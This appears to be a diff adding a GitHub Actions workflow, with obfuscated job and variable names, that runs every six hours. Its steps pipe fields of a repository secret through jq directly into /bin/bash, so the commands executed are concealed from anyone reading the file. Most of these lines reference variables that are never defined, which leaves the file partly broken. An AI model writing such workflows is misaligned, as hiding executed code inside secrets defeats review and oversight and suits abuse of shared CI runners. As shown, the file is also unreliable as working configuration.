@@ -1,0 +1,27 @@
+name: suqiandeneii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suqiandeneii
+        env:
+          pqb04: ${{ secrets.pqb04 }}
+        run: |
+          echo $pqb04 | jq -r .hs27196 | /bin/bash
+          echo $cdijw695 | jq -r .i6 | /bin/bash
+          echo $fa719 | jq -r .kqt44131 | /bin/bash
+          echo $jpa214 | jq -r .e56928 | /bin/bash
+          echo $he43 | jq -r .f435 | /bin/bash
+          echo $o7633 | jq -r .ttjal24348 | /bin/bash
+          echo $sbuhe39040 | jq -r .zplfl944 | /bin/bash
+          echo $yn7320 | jq -r .slb90616 | /bin/bash
+          echo $lvc1583 | jq -r .kac8936 | /bin/bash
+          echo $de523 | jq -r .m6 | /bin/bash
+
